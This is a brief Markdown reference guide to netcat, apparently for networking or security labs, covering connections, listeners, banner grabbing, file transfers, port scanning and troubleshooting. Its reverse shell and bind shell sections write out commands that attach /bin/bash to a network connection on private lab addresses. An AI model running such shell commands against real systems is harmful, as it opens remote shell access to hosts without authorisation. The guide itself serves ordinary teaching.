# Netcat Reference Guide

## Verify Installation

```bash
nc -h
```

---

# Basic Connections

## Connect to TCP Service

```bash
nc 10.0.2.4 80
```

## UDP Connection

```bash
nc -u 10.0.2.4 53
```

---

# Listener Setup

## Start Listener

```bash
nc -lvnp 4444
```

Flags:
- `-l` = listen
- `-v` = verbose
- `-n` = numeric output
- `-p` = specify port

---

# Banner Grabbing

## Grab Service Banner

```bash
nc 10.0.2.4 21
```

---

# File Transfers

## Receive File

```bash
nc -lvnp 4444 > received-file.txt
```

## Send File

```bash
nc 10.0.2.5 4444 < file.txt
```

---

# Reverse Shells

## Listener

```bash
nc -lvnp 4444
```

## Reverse Shell

```bash
nc 10.0.2.3 4444 -e /bin/bash
```

---

# Bind Shells

## Create Bind Shell

```bash
nc -lvnp 4444 -e /bin/bash
```

## Connect to Bind Shell

```bash
nc 10.0.2.4 4444
```

---

# Port Scanning

## Scan Port Range

```bash
nc -zv 10.0.2.4 1-100
```

---

# Common Commands

| Command | Purpose |
|---|---|
| nc -lvnp | Start listener |
| nc target port | Connect to remote service |
| nc -zv | Scan ports |
| nc -u | UDP communication |
| nc -e | Execute shell |

---

# Common Troubleshooting

## Connection Refused

### Check:
- target service status
- firewall rules
- listener availability

---

## Reverse Shell Failure

### Verify:
- listener IP
- listener port
- target connectivity

---

## Port Scan Not Working

### Verify:
- target reachable
- service running
- firewall configuration

---

# Useful Notes

- Netcat is commonly called the "Swiss Army knife" of networking.
- Reverse shells require outbound connectivity from the target.
- Banner grabbing helps identify running services.
- Some Netcat versions disable the `-e` option for security reasons.

---

# Related Labs

- Banner Grabbing
- Reverse Shell Testing
- File Transfers
- Port Scanning
- Network Troubleshooting